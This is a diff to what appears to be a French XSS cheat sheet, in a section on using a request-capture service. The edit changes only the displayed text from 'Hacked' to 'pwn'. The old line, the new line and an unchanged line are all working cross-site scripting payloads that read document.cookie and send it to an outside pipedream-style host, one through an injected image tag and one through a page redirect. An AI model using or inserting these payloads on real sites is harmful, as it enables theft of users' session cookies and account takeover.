@@ -14,7 +14,7 @@
 ## Variante avec requestbin
 
 ```js
-<script>document.write('<IMG SRC=\"https://eowc--skipp--pedream.net?cookie='+document.cookie+'\">Hacked</IMG>');</script>`
+<script>document.write('<IMG SRC=\"https://eowc--skipp--pedream.net?cookie='+document.cookie+'\">pwn</IMG>');</script>`
 <script>document.location.href = 'https://eowc--skipp--pedream.net?cookies =' + document.cookie;</script>
 ```
 
